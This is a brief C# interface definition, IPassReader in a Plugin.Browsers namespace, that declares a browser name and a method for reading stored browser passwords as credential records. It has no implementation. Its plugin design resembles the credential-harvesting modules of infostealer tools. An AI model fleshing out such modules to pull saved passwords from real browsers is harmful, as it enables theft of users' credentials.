using System.Collections.Generic;

namespace Plugin.Browsers;

internal interface IPassReader
{
	string BrowserName { get; }

	IEnumerable<CredentialModel> ReadPasswords();
}
